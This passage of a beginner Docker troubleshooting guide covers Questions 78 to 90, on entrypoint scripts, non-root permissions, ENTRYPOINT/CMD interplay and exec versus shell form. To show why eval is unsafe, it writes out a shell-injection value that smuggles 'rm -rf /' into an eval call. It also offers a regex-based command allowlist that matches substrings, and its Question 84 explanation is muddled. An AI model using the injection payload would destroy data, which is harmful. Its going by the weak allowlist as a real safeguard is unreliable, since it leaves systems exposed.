# Execute the predefined command
exec python3 /app/app.py
```

```dockerfile
FROM ubuntu:20.04
# ...
ENTRYPOINT ["/entrypoint.sh"]
# No CMD - entrypoint handles everything
```

**Corrected Complete Example:**
```dockerfile
FROM python:3.9-slim

RUN apt-get update && \
    apt-get install -y --no-install-recommends netcat && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh

# Non-root user
RUN useradd -m appuser && chown -R appuser:appuser /app /entrypoint.sh
USER appuser

ENTRYPOINT ["/entrypoint.sh"]
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:app"]
```

**entrypoint.sh:**
```bash
#!/bin/bash
set -e  # Exit on error

# Wait for database
echo "Waiting for database..."
while ! nc -z ${DB_HOST:-db} ${DB_PORT:-5432}; do
  sleep 0.1
done
echo "Database ready!"

# Run migrations (as specific command, not eval)
if [ "$RUN_MIGRATIONS" = "true" ]; then
  echo "Running migrations..."
  python manage.py migrate --noinput
fi

# Execute main command safely (no eval!)
exec "$@"
```

**Explanation for Beginners:**

**eval is Dangerous:**
```bash
eval "$@"
# Executes argument as shell command
# Allows code injection
# Security vulnerability!
```

**exec is Safe:**
```bash
exec "$@"
# Replaces current process with new process
# Passes arguments to executable
# No shell interpretation
# No injection risk
```

**Shell Injection:**
```bash
# Vulnerable
eval "$USER_INPUT"

# User provides:
USER_INPUT="; rm -rf /"
# Result: eval "; rm -rf /"
# Executes deletion!
```

**Safe Command Execution:**

**Option 1: Direct execution:**
```bash
exec python3 app.py
```

**Option 2: Pass arguments safely:**
```bash
exec "$@"
# Safely passes all arguments to command
```

**Option 3: Validate before executing:**
```bash
allowed_commands="python3 gunicorn flask"
if [[ $allowed_commands =~ $1 ]]; then
  exec "$@"
else
  echo "Command not allowed"
  exit 1
fi
```

**Entrypoint Best Practices:**
1. **Never use eval** with user input
2. **Validate commands** if you must execute dynamically
3. **Use exec** for proper signal handling
4. **Set -e** to exit on errors
5. **Limit what can be executed**
6. **Document expected usage**

**Example - Secure Entrypoint:**
```bash
#!/bin/bash
set -e

# Parse arguments
case "$1" in
  "web")
    exec gunicorn app:app
    ;;
  "worker")
    exec celery -A app worker
    ;;
  "migrate")
    exec python manage.py migrate
    ;;
  *)
    echo "Usage: $0 {web|worker|migrate}"
    exit 1
    ;;
esac
```

---

### Question 79
**Dockerfile:**
```dockerfile
FROM node:14
RUN npm install -g nodemon
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
USER node
EXPOSE 3000
CMD ["nodemon", "server.js"]
```

**Tasks:**
a. What's the permission issue?  
b. Fix the user/permissions

**Solution:**

**a. Permission Issue:**

1. **Error:** Files copied as root (before USER node)
2. **Error:** node user can't write to /app
3. **Error:** nodemon might need to write files (restart tracking)
4. **Error:** Application logs might fail to write

**What Happens:**
```
Files copied as root (UID 0)
USER node (UID 1000)
node user can't modify files in /app
Application errors when trying to write
```

**b. Fixed Dockerfile:**

**Option 1: Set ownership after copy:**
```dockerfile
FROM node:14-alpine

# Install nodemon globally
RUN npm install -g nodemon

# Create app directory
WORKDIR /app

# Copy package files
COPY package*.json ./

# Install dependencies
RUN npm ci

# Copy application
COPY . .

# Fix ownership
RUN chown -R node:node /app

# Switch to non-root user
USER node

EXPOSE 3000

CMD ["nodemon", "server.js"]
```

**Option 2: Use COPY --chown:**
```dockerfile
FROM node:14-alpine

RUN npm install -g nodemon

WORKDIR /app

# Copy with correct ownership from start
COPY --chown=node:node package*.json ./
RUN npm ci

COPY --chown=node:node . .

USER node

EXPOSE 3000

CMD ["nodemon", "server.js"]
```

**Option 3: Create writable directories:**
```dockerfile
FROM node:14-alpine

RUN npm install -g nodemon

WORKDIR /app

COPY --chown=node:node package*.json ./
RUN npm ci

COPY --chown=node:node . .

# Ensure writable directories for node user
RUN mkdir -p logs tmp && \
    chown -R node:node logs tmp

USER node

EXPOSE 3000

CMD ["nodemon", "server.js"]
```

**Explanation for Beginners:**

**File Ownership in Docker:**

**Default Behavior:**
```dockerfile
FROM node:14
COPY . /app
# Files owned by root (UID 0)

USER node
# Now running as UID 1000
# Can't write to /app (owned by root)
```

**Solution 1: Change ownership after copy:**
```dockerfile
COPY . /app
RUN chown -R node:node /app
USER node
```

**Solution 2: Copy with correct ownership:**
```dockerfile
COPY --chown=node:node . /app
USER node
```

**Understanding Users:**

**Root (UID 0):**
- Default user in Docker
- Can do anything
- Security risk if compromised

**Non-root (UID > 0):**
- Limited permissions
- Can only modify owned files
- More secure
- Best practice

**Common Issues with Non-Root:**

**1. Can't write to directories:**
```dockerfile
USER node
RUN mkdir /var/log/myapp  # Error: permission denied
```

**Fix:**
```dockerfile
RUN mkdir /var/log/myapp && chown node:node /var/log/myapp
USER node
```

**2. Can't bind to privileged ports (<1024):**
```javascript
// Can't bind to port 80 as non-root
app.listen(80);  // Error!

// Use port > 1024
app.listen(3000);  // Works!
```

**3. Can't install global packages:**
```dockerfile
USER node
RUN npm install -g package  # Error!
```

**Fix:**
```dockerfile
RUN npm install -g package  # Install as root
USER node                   # Then switch
```

**Best Practices:**
1. **Do privileged operations as root first**
2. **Then switch to non-root user**
3. **Use COPY --chown** for correct ownership
4. **Create writable directories** before switching users
5. **Test as non-root** before deployment

**Complete Example:**
```dockerfile
FROM node:14-alpine

# Install global tools as root
RUN npm install -g nodemon pm2

# Create non-root user (already exists in node image)
# Create writable directories
RUN mkdir -p /app/logs /app/tmp && \
    chown -R node:node /app

WORKDIR /app

# Copy with correct ownership
COPY --chown=node:node package*.json ./
RUN npm ci

COPY --chown=node:node . .

# Switch to non-root user
USER node

EXPOSE 3000

HEALTHCHECK CMD node healthcheck.js || exit 1

CMD ["nodemon", "--inspect=0.0.0.0:9229", "server.js"]
```

---

### Question 80
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
EXPOSE 5000
USER nobody
CMD ["flask", "run"]
```

**Tasks:**
a. Why might this fail?  
b. Fix the permission issue

**Solution:**

**a. Why It Might Fail:**

1. **Issue:** 'nobody' user has no write permissions to /app
2. **Issue:** Flask might need to write logs, cache, sessions
3. **Issue:** Files owned by root, running as nobody (UID 65534)
4. **Issue:** nobody user might not even exist properly in image

**What Happens:**
```
Files in /app owned by root
USER nobody (UID 65534)
Flask tries to write:
- Session files
- Cache
- Logs
Permission denied!
```

**b. Fixed Dockerfile:**

**Option 1: Create proper user with permissions:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

# Install dependencies as root
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY . .

# Create user and set ownership
RUN useradd -m -u 1000 appuser && \
    chown -R appuser:appuser /app

# Switch to non-root user
USER appuser

EXPOSE 5000

CMD ["flask", "run", "--host=0.0.0.0"]
```

**Option 2: Use existing user with proper setup:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Create writable directories
RUN mkdir -p /app/instance /app/logs /app/tmp

COPY . .

# Set ownership for nobody user
RUN chown -R nobody:nogroup /app

USER nobody

EXPOSE 5000

CMD ["flask", "run", "--host=0.0.0.0"]
```

**Option 3: Read-only with tmpfs:**
```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Create user
RUN useradd -m appuser && \
    chown -R appuser:appuser /app

USER appuser

EXPOSE 5000

CMD ["gunicorn", "--bind", "0.0.0.0:5000", "app:app"]
```

**Run with read-only filesystem:**
```bash
docker run -d \
  --read-only \
  --tmpfs /tmp \
  --tmpfs /app/instance:uid=1000 \
  -p 5000:5000 \
  myapp
```

**Explanation for Beginners:**

**Understanding 'nobody' User:**
- UID 65534 (very high number)
- Minimal privileges
- Sometimes used for security
- But can cause permission issues

**Better: Create Specific User:**
```dockerfile
RUN useradd -m -u 1000 appuser
USER appuser
# Clear ownership and permissions
```

**Applications Need Write Access For:**
- Log files
- Temporary files
- Session storage
- Cache
- PID files
- Socket files

**Solutions:**

**1. Create writable directories:**
```dockerfile
RUN mkdir -p /app/logs /app/tmp /app/cache && \
    chown -R appuser:appuser /app
USER appuser
```

**2. Use /tmp for temporary files:**
```python
import tempfile
tmpdir = tempfile.mkdtemp()  # Uses /tmp by default
```

**3. Configure app to use writable locations:**
```python
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
app.config['CACHE_DIR'] = '/tmp/cache'
```

**4. Use tmpfs for temporary writes:**
```bash
docker run --tmpfs /tmp --tmpfs /var/cache myapp
```

**Complete Secure Example:**
```dockerfile
FROM python:3.9-slim

# Create non-root user
RUN groupadd -r -g 1000 appuser && \
    useradd -r -u 1000 -g appuser -m -s /sbin/nologin appuser

WORKDIR /app

# Install dependencies as root
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt gunicorn

# Copy application
COPY --chown=appuser:appuser . .

# Create writable directories
RUN mkdir -p /app/instance /app/logs && \
    chown -R appuser:appuser /app/instance /app/logs

# Switch to non-root user
USER appuser

# Configure Flask
ENV FLASK_APP=app.py
ENV FLASK_ENV=production

EXPOSE 8000

HEALTHCHECK CMD python -c "import requests; requests.get('http://localhost:8000/health')"

CMD ["gunicorn", \
     "--bind", "0.0.0.0:8000", \
     "--workers", "4", \
     "--access-logfile", "/app/logs/access.log", \
     "--error-logfile", "/app/logs/error.log", \
     "app:app"]
```

**Permissions Checklist:**
1. ✓ Non-root user created
2. ✓ Application files owned by user
3. ✓ Writable directories created
4. ✓ Appropriate permissions set
5. ✓ User switched before CMD
6. ✓ Application tested with non-root user

---

## Questions 81-90: ENTRYPOINT and CMD Errors

### Question 81
**Dockerfile:**
```dockerfile
FROM alpine
ENTRYPOINT ["echo"]
CMD ["Hello World"]
```

**Commands:**
```bash
docker run myapp
docker run myapp Goodbye
```

**Tasks:**
a. What will each command output?  
b. Explain ENTRYPOINT and CMD interaction

**Solution:**

**a. Output:**

**Command 1:**
```bash
docker run myapp
# Output: Hello World
# Why: ENTRYPOINT(echo) + CMD(Hello World) = echo Hello World
```

**Command 2:**
```bash
docker run myapp Goodbye
# Output: Goodbye
# Why: ENTRYPOINT(echo) + ARG(Goodbye) = echo Goodbye
# CMD is replaced by "Goodbye"
```

**b. ENTRYPOINT and CMD Interaction:**

**How They Work Together:**
```
Final command = ENTRYPOINT + CMD (or arguments)

If no arguments provided:
ENTRYPOINT + CMD

If arguments provided:
ENTRYPOINT + arguments (CMD ignored!)
```

**Examples:**

**Example 1:**
```dockerfile
ENTRYPOINT ["python"]
CMD ["app.py"]
```
```bash
docker run myapp           → python app.py
docker run myapp test.py   → python test.py
```

**Example 2:**
```dockerfile
ENTRYPOINT ["echo", "Hello"]
CMD ["World"]
```
```bash
docker run myapp           → echo Hello World → "Hello World"
docker run myapp Docker    → echo Hello Docker → "Hello Docker"
```

**Example 3:**
```dockerfile
CMD ["python", "app.py"]
# No ENTRYPOINT
```
```bash
docker run myapp           → python app.py
docker run myapp bash      → bash (completely replaces CMD!)
```

**Explanation for Beginners:**

**ENTRYPOINT:**
- Always executed
- Arguments append to it
- Use for fixed command

**CMD:**
- Provides default arguments to ENTRYPOINT
- Or provides default command if no ENTRYPOINT
- Replaced by docker run arguments

**Use Cases:**

**Use ENTRYPOINT when:**
```dockerfile
ENTRYPOINT ["python"]
CMD ["app.py"]
# Users can easily switch scripts:
# docker run myapp test.py
```

**Use CMD when:**
```dockerfile
CMD ["python", "app.py"]
# Users might want completely different command:
# docker run myapp bash
```

**Use both when:**
```dockerfile
ENTRYPOINT ["docker-entrypoint.sh"]
CMD ["python", "app.py"]
# Entrypoint does setup, then runs CMD
```

---

### Question 82
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
ENTRYPOINT python app.py
```

**Tasks:**
a. What's wrong with ENTRYPOINT format?  
b. Fix it with both formats

**Solution:**

**a. Error:**

1. **Error:** ENTRYPOINT in shell form, not exec form
2. **Issue:** Shell form doesn't handle signals properly
3. **Issue:** Can't easily pass arguments
4. **Issue:** Process doesn't receive SIGTERM

**What Happens:**
```
Shell form: ENTRYPOINT python app.py
Actually runs: /bin/sh -c "python app.py"
Process tree:
  PID 1: /bin/sh
  PID 2: python app.py

SIGTERM sent to PID 1 (shell), not your app!
App doesn't shut down gracefully
```

**b. Fixed Formats:**

**Option 1: Exec form (recommended):**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
ENTRYPOINT ["python", "app.py"]
```

**Option 2: Exec form with CMD:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
ENTRYPOINT ["python"]
CMD ["app.py"]
```

**Option 3: Shell form (when you need shell features):**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
ENTRYPOINT exec python app.py
# Using 'exec' in shell form for proper signal handling
```

**Explanation for Beginners:**

**Two Formats:**

**1. Exec Form (JSON array - recommended):**
```dockerfile
ENTRYPOINT ["executable", "param1", "param2"]
CMD ["executable", "param1", "param2"]
```
**Pros:**
- No shell wrapping
- Proper signal handling
- Process is PID 1
- Can't use shell features ($VAR, &&, ||)

**2. Shell Form (string):**
```dockerfile
ENTRYPOINT command param1 param2
CMD command param1 param2
```
**Pros:**
- Can use shell features
- Variable expansion works
**Cons:**
- Wrapped in /bin/sh -c
- Poor signal handling
- Process is not PID 1

**Signal Handling:**

**With exec form:**
```dockerfile
ENTRYPOINT ["python", "app.py"]
```
```
Process tree:
PID 1: python app.py
Ctrl+C (SIGTERM) → python receives signal → graceful shutdown
```

**With shell form:**
```dockerfile
ENTRYPOINT python app.py
```
```
Process tree:
PID 1: /bin/sh -c "python app.py"
PID 2: python app.py
Ctrl+C (SIGTERM) → shell receives signal → python might not shutdown properly
```

**When to Use Shell Form:**
- Need variable expansion
- Need shell features (&&, ||, $VAR)
- Use `exec` to fix signal handling

**Example:**
```dockerfile
ENTRYPOINT exec python -u app.py
# exec replaces shell with python, fixing signal handling
```

**Best Practices:**
1. **Use exec form** (JSON array) by default
2. **Use shell form** only when needed
3. **Add exec** in shell form for proper signals
4. **Test signal handling** (Ctrl+C, docker stop)

---

### Question 83
**Dockerfile:**
```dockerfile
FROM alpine
ENTRYPOINT ["/bin/sh", "-c"]
CMD ["echo Hello"]
```

**Command:**
```bash
docker run myapp "echo Goodbye"
```

**Tasks:**
a. What will be output?  
b. Why?

**Solution:**

**a. Output:**

```
Goodbye
```

**b. Explanation:**

**How It Works:**
```
ENTRYPOINT: ["/bin/sh", "-c"]
CMD: ["echo Hello"]
Arguments: "echo Goodbye"

CMD gets replaced by arguments:
Final command: /bin/sh -c "echo Goodbye"
Result: Goodbye
```

**Full Breakdown:**
```bash
# Without arguments
docker run myapp
# Executes: /bin/sh -c "echo Hello"
# Output: Hello

# With arguments
docker run myapp "echo Goodbye"
# Executes: /bin/sh -c "echo Goodbye"
# Output: Goodbye

# With complex command
docker run myapp "echo Hello && echo World"
# Executes: /bin/sh -c "echo Hello && echo World"
# Output:
# Hello
# World
```

**Explanation for Beginners:**

**ENTRYPOINT with Shell:**

**Pattern:**
```dockerfile
ENTRYPOINT ["/bin/sh", "-c"]
CMD ["command"]
```

**Usage:**
```bash
docker run myapp "any shell command here"
# Executes in shell
```

**Benefits:**
- Can run any shell command
- Variable expansion works
- Can use pipes, redirects, etc.

**Drawbacks:**
- Less secure (arbitrary command execution)
- Signal handling issues
- Not recommended for production

**Better Alternatives:**

**Option 1: Specific entrypoint:**
```dockerfile
ENTRYPOINT ["python"]
CMD ["app.py"]
```
```bash
docker run myapp test.py  # Runs python test.py
```

**Option 2: Script entrypoint:**
```dockerfile
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
CMD ["python", "app.py"]
```

**entrypoint.sh:**
```bash
#!/bin/sh
set -e
# Initialization
exec "$@"
```

---

### Question 84
**Dockerfile:**
```dockerfile
FROM busybox
ENTRYPOINT ["top"]
CMD ["-b"]
```

**Commands:**
```bash
docker run -d myapp
docker exec myapp ps
```

**Tasks:**
a. Why does exec fail?  
b. What's the issue?

**Solution:**

**a. Why Exec Fails:**

1. **Issue:** `top -b` runs in foreground, consuming PID 1
2. **Issue:** `ps` command might not exist in busybox minimal image
3. **Issue:** exec tries to run ps but command not found or container architecture issues

**What Happens:**
```
Container starts: top -b (interactive process monitor)
docker exec myapp ps
Possible errors:
- "ps: command not found" (busybox might not have ps)
- Or ps works but shows limited info
```

**b. Fixed Approach:**

**Option 1: Use image with full utilities:**
```dockerfile
FROM alpine:latest
RUN apk add --no-cache procps
ENTRYPOINT ["top"]
CMD ["-b"]
```

```bash
docker exec myapp ps aux
# Now works!
```

**Option 2: Use proper base for your needs:**
```dockerfile
FROM ubuntu:20.04
CMD ["sleep", "infinity"]
```

```bash
docker run -d myapp
docker exec myapp ps aux
docker exec myapp top
# All commands available
```

**Explanation for Beginners:**

**Minimal Images:**
- Busybox: Very minimal, limited commands
- Alpine: Small but has package manager
- Debian-slim: More complete, larger

**Command Availability:**
```
busybox:
- Basic commands only
- Might not have ps, top, etc.

alpine:
- More commands
- Can install: apk add procps

ubuntu:
- Full command set
- apt-get install anything
```

**Testing Commands in Container:**
```bash
# Check available commands
docker run --rm busybox ls /bin
docker run --rm alpine ls /usr/bin  
docker run --rm ubuntu:20.04 which ps
```

---

### Question 85
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
CMD npm start
```

**Tasks:**
a. What's wrong with CMD format?  
b. Show correct formats

**Solution:**

**a. Error:**

1. **Error:** CMD in shell form (not recommended)
2. **Issue:** Doesn't handle signals properly
3. **Issue:** Wrapped in /bin/sh -c

**Corrected Formats:**

**Option 1: Exec form (recommended):**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
CMD ["npm", "start"]
```

**Option 2: Exec form with explicit commands:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
CMD ["node", "server.js"]
```

**Option 3: With ENTRYPOINT:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
ENTRYPOINT ["node"]
CMD ["server.js"]
```

**Comparison:**

**Shell form:**
```dockerfile
CMD npm start
# Actually runs: /bin/sh -c "npm start"
# PID 1: shell
# PID 2+: npm and node
```

**Exec form:**
```dockerfile
CMD ["npm", "start"]
# Runs directly: npm start
# PID 1: npm
# Better signal handling
```

**Best form:**
```dockerfile
CMD ["node", "server.js"]
# Runs directly: node server.js
# PID 1: node process
# Best signal handling
```

**Explanation for Beginners:**

**Why Exec Form is Better:**

**1. Signal Handling:**
```
Exec form: SIGTERM → your process directly
Shell form: SIGTERM → shell → might not reach your process
```

**2. Process PID:**
```
Exec form: Your app is PID 1
Shell form: Shell is PID 1, your app is PID 2+
```

**3. Clean shutdown:**
```bash
docker stop myapp
# Sends SIGTERM to PID 1
# Exec form: Your app receives it, shuts down gracefully
# Shell form: Shell receives it, might not forward properly
```

**When to Use Each:**

**Use exec form (default):**
```dockerfile
CMD ["python", "app.py"]
ENTRYPOINT ["node", "server.js"]
```

**Use shell form when you need:**
```dockerfile
CMD echo $HOME                    # Variable expansion
CMD java -jar app.jar && cleanup  # Shell operators
```

**Use exec in shell form:**
```dockerfile
CMD exec python app.py
# Gets benefits of both
```

---

### Question 86
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
ENTRYPOINT ["python", "app.py"]
CMD ["--port", "5000"]
```

**Command:**
```bash
docker run myapp --debug
```

**Tasks:**
a. What actually runs?  
b. How to pass both --port and --debug?

**Solution:**

**a. What Runs:**

```bash
docker run myapp --debug
# Result: python app.py --debug
# Lost --port 5000 from CMD!
```

**Arguments replace CMD entirely, not append!**

**b. Passing Both:**

**Option 1: Pass all arguments:**
```bash
docker run myapp --port 5000 --debug
# Result: python app.py --port 5000 --debug
```

**Option 2: Use ENV for defaults:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
ENV PORT=5000
ENTRYPOINT ["python", "app.py"]
# App reads port from environment variable
```

```bash
docker run myapp --debug
# App uses PORT=5000 from ENV and --debug from args
```

**Option 3: Use entrypoint script:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY . .
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
CMD []
```

**entrypoint.sh:**
```bash
#!/bin/bash
set -e

# Default values
PORT=${PORT:-5000}
DEBUG=${DEBUG:-false}

# Build command
CMD="python app.py --port $PORT"

if [ "$DEBUG" = "true" ]; then
  CMD="$CMD --debug"
fi

# Add any additional arguments
if [ $# -gt 0 ]; then
  CMD="$CMD $@"
fi

exec $CMD
```

```bash
docker run -e DEBUG=true myapp
docker run myapp --extra-flag
```

**Explanation for Beginners:**

**Argument Behavior:**

**With ENTRYPOINT + CMD:**
```dockerfile
ENTRYPOINT ["cmd"]
CMD ["arg1", "arg2"]
```

**Default run:**
```bash
docker run myapp
# Executes: cmd arg1 arg2
```

**With arguments:**
```bash
docker run myapp arg3 arg4
# Executes: cmd arg3 arg4
# (CMD is completely replaced!)
```

**Strategies for Multiple Arguments:**

**1. Pass all explicitly:**
```bash
docker run myapp --port 5000 --debug --verbose
```

**2. Use environment variables:**
```dockerfile
ENV PORT=5000 DEBUG=false
ENTRYPOINT ["python", "app.py"]
```
```bash
docker run -e DEBUG=true myapp
```

**3. Use config file:**
```dockerfile
COPY config.yml /app/
ENTRYPOINT ["python", "app.py", "--config", "config.yml"]
```

**4. Combination approach:**
```dockerfile
ENV PORT=5000
ENTRYPOINT ["python", "app.py"]
CMD []
```
```bash
docker run -e PORT=8000 myapp --debug --verbose
# python app.py --debug --verbose
# Reads PORT from environment
```

---

### Question 87
**Dockerfile:**
```dockerfile
FROM alpine
CMD ["echo", "$HOME"]
```

**Tasks:**
a. What will this output?  
b. How to get variable expansion?

**Solution:**

**a. Output:**

```
$HOME
```

Not the actual home directory value!

**Why:**
```
Exec form: ["echo", "$HOME"]
No shell → no variable expansion
Literally outputs: $HOME
```

**b. Getting Variable Expansion:**

**Option 1: Use shell form:**
```dockerfile
FROM alpine
CMD echo $HOME
# Uses shell, variable expands
```

**Option 2: Use exec form with sh -c:**
```dockerfile
FROM alpine
CMD ["sh", "-c", "echo $HOME"]
# Shell interprets $HOME
```

**Option 3: Set in entrypoint:**
```dockerfile
FROM alpine
COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

**entrypoint.sh:**
```bash
#!/bin/sh
echo "Home directory is: $HOME"
exec "$@"
```

**Explanation for Beginners:**

**Exec Form (JSON array):**
```dockerfile
CMD ["echo", "$HOME"]
# No shell
# No variable expansion
# Outputs literal: $HOME
```

**Shell Form (string):**
```dockerfile
CMD echo $HOME
# Uses shell
# Variable expansion works
# Outputs actual: /root
```

**When You Need Variable Expansion:**

**Option 1: Shell form:**
```dockerfile
CMD echo $PATH
```

**Option 2: sh -c wrapper:**
```dockerfile
CMD ["sh", "-c", "echo $PATH"]
```

**Option 3: Entrypoint script:**
```bash
#!/bin/sh
echo "PATH is: $PATH"
exec python app.py
```

**Variables Available:**
- $HOME: Home directory
- $PATH: Command search path
- $USER: Username
- Any ENV set in Dockerfile
- Any -e passed at runtime

**Example:**
```dockerfile
FROM alpine
ENV APP_NAME=myapp
ENV APP_VERSION=1.0

# Exec form - no expansion
CMD ["echo", "$APP_NAME"]  # Outputs: $APP_NAME

# Shell form - expansion works
CMD echo $APP_NAME           # Outputs: myapp

# Exec with shell - expansion works
CMD ["sh", "-c", "echo $APP_NAME"]  # Outputs: myapp
```

---

### Question 88
**Dockerfile:**
```dockerfile
FROM node:14
WORKDIR /app
COPY . .
ENTRYPOINT ["npm"]
CMD ["start"]
```

**Command:**
```bash
docker run myapp run test
```

**Tasks:**
a. What command actually executes?  
b. Is this the intended behavior?

**Solution:**

**a. What Executes:**

```bash
docker run myapp run test
# Result: npm run test
# ENTRYPOINT(npm) + ARGS(run test) = npm run test
```

**b. Intended Behavior:**

**Yes, this is actually clever!** It makes the container an "npm wrapper".

**Usage Examples:**
```bash
docker run myapp start         → npm start
docker run myapp run test      → npm run test
docker run myapp run build     → npm run build
docker run myapp install       → npm install
```

**When This Makes Sense:**

**For utility containers:**
```dockerfile
# npm wrapper
ENTRYPOINT ["npm"]
CMD ["start"]

# python wrapper
ENTRYPOINT ["python"]
CMD ["app.py"]

# curl wrapper
ENTRYPOINT ["curl"]
CMD ["--help"]
```

**When This Doesn't Make Sense:**

**For application containers:**
```dockerfile
# Bad: Too flexible
ENTRYPOINT ["npm"]
CMD ["start"]
# User could run: docker run myapp install (unintended!)

# Good: Specific command
CMD ["node", "server.js"]
# Clear purpose: runs the application
```

**Explanation for Beginners:**

**Design Patterns:**

**1. Application Container (specific purpose):**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY . .
CMD ["node", "server.js"]
# Purpose: Run this specific application
```

**2. Utility Container (flexible tool):**
```dockerfile
FROM alpine
RUN apk add --no-cache curl
ENTRYPOINT ["curl"]
CMD ["--help"]
# Purpose: Run curl with any arguments
```

**3. Wrapper Container:**
```dockerfile
FROM node:14-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
ENTRYPOINT ["npm"]
CMD ["start"]
# Purpose: Run npm commands in consistent environment
```

**Examples of Each:**

**Application:**
```bash
docker run web-app
# Always starts the web server
```

**Utility:**
```bash
docker run my-curl https://api.example.com
docker run my-curl -X POST https://api.example.com
# Flexible curl usage
```

**Wrapper:**
```bash
docker run node-wrapper start
docker run node-wrapper run test
docker run node-wrapper run build
# Easy access to npm commands
```

**When to Use:**
- **Application**: Production services
- **Utility**: Development tools
- **Wrapper**: Build/test environments

---

### Question 89
**Dockerfile:**
```dockerfile
FROM python:3.9
WORKDIR /app
COPY . .
CMD ["flask", "run"]
ENTRYPOINT ["python", "-m"]
```

**Tasks:**
a. What's wrong with the order?  
b. Does order matter?

**Solution:**

**a. What's Wrong:**

**Nothing is technically wrong!** Order of CMD and ENTRYPOINT doesn't matter in Dockerfile.

**Both work the same:**
```dockerfile
# Order 1
CMD ["flask", "run"]
ENTRYPOINT ["python", "-m"]

# Order 2
ENTRYPOINT ["python", "-m"]
CMD ["flask", "run"]

# Both execute: python -m flask run
```

**b. Does Order Matter:**

**No, but convention says:**
1. ENTRYPOINT usually comes before CMD
2. More readable: ENTRYPOINT first, then CMD
3. Logical flow: fixed command, then default args

**Best Practice Order:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .

# Conventional order
ENTRYPOINT ["python", "-m"]
CMD ["flask", "run", "--host=0.0.0.0"]
```

**Explanation for Beginners:**

**Order in Dockerfile:**
- Final result is same regardless of order
- But follow conventions for readability
- ENTRYPOINT before CMD is standard

**What Matters:**
```
ENTRYPOINT + CMD = Final command
Order in Dockerfile: Doesn't affect execution
Readability: ENTRYPOINT first is clearer
```

**Examples:**

**Both work identically:**
```dockerfile
# Style 1
ENTRYPOINT ["python"]
CMD ["app.py"]

# Style 2  
CMD ["app.py"]
ENTRYPOINT ["python"]

# Both execute: python app.py
```

**Recommended Style:**
```dockerfile
FROM python:3.9-slim
WORKDIR /app

# Install dependencies
COPY requirements.txt .
RUN pip install -r requirements.txt

# Copy application
COPY . .

# Create user
RUN useradd -m appuser && chown -R appuser:appuser /app
USER appuser

# Port
EXPOSE 5000

# Command (conventional order)
ENTRYPOINT ["python", "-m"]
CMD ["flask", "run", "--host=0.0.0.0"]
```

---

### Question 90
**Dockerfile:**
```dockerfile
FROM alpine
ENTRYPOINT ["/entrypoint.sh"]
CMD ["/app/start.sh"]
```

**entrypoint.sh:**
```bash
#!/bin/sh
echo "Initializing..."
$@
```

**Tasks:**
a. What's missing in entrypoint?  
b. Fix the script

**Solution:**

**a. What's Missing:**

1. **Error:** Missing `exec` before `$@`
2. **Issue:** entrypoint.sh becomes PID 1 and stays running
3. **Issue:** Actual application is child process
4. **Issue:** Signals don't propagate properly

**What Happens:**
```
Process tree:
PID 1: /entrypoint.sh
PID 2: /app/start.sh (your actual app)

docker stop: Sends SIGTERM to PID 1 (entrypoint.sh)
PID 2 (your app) doesn't receive signal properly
Container doesn't shut down gracefully
```

**b. Fixed Scripts:**

**Option 1: Add exec:**
```bash
#!/bin/sh
set -e

echo "Initializing..."

# exec replaces shell with the command
exec "$@"
```

**Option 2: Complete entrypoint:**
```bash
#!/bin/sh
set -e

echo "Starting application..."
echo "Time: $(date)"
echo "User: $(whoami)"

# Check if data directory exists
if [ ! -d "/app/data" ]; then
  echo "Creating data directory..."
  mkdir -p /app/data
fi

# Wait for database (if needed)
if [ -n "$DB_HOST" ]; then
  echo "Waiting for database at $DB_HOST:${DB_PORT:-5432}..."
  while ! nc -z ${DB_HOST} ${DB_PORT:-5432}; do
    sleep 0.1
  done
  echo "Database is ready!"
fi

echo "Executing: $@"
# exec replaces this script with your command
exec "$@"
```

**Updated Dockerfile:**
```dockerfile
FROM alpine:latest

RUN apk add --no-cache bash netcat-openbsd

WORKDIR /app

COPY entrypoint.sh /
RUN chmod +x /entrypoint.sh

COPY . .

ENTRYPOINT ["/entrypoint.sh"]
CMD ["/app/start.sh"]
```

**Explanation for Beginners:**

**exec in Shell Scripts:**

**Without exec:**
```bash
#!/bin/sh
echo "Starting..."
python app.py

# Process tree:
# PID 1: shell script
# PID 2: python app.py
# Shell stays running!
```

**With exec:**
```bash
#!/bin/sh
echo "Starting..."
exec python app.py

# Process tree:
# PID 1: python app.py
